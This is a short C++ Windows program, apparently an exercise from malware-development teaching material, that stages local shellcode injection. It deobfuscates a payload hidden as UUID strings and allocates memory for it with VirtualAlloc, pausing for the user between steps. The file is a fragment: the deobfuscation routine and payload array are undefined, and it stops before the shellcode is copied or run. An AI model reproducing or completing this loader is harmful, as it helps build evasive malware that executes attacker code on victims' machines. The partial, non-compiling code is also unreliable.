#include <iostream>
#include <Windows.h>

int main()
{
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = NULL;

    printf("[i] Injecting shellcode the local process of pid : %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> to decrypt..");
    getchar();

    printf("[i] Decrypting...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE! \n");
    printf("[i] Deobfuscated Payload at : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
    }


    return 0;

}
